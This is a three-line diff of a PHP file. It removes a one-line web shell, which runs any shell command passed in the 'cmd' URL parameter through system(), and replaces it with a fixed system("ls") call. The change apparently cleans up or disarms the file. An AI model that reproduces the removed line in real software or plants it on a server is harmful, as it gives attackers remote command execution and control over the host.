@@ -1,1 +1,3 @@
-<? $cmd = $_GET['cmd']; system($cmd) ?>
+<?
+system("ls");
+?>
